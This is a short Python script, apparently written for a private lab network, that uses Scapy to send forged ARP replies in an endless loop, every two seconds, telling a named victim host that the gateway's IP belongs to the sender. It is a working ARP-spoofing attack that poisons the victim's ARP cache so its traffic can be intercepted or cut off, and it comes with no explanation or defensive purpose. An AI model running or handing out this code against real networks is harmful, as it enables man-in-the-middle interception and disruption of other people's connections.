import time


from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp


def main():
    gatewayIP="192.168.82.2"
    victimIP="192.168.82.156"
    hackMAC="00:0c:29:f5:0b:46"
    victimMAC="00:0c:29:05:17:1c"
    packet=Ether()/ARP(psrc=gatewayIP,pdst=victimIP)
    while 1:
        sendp(packet)
        time.sleep(2)
        print(packet.show())
    pass

if __name__=="__main__":
    main()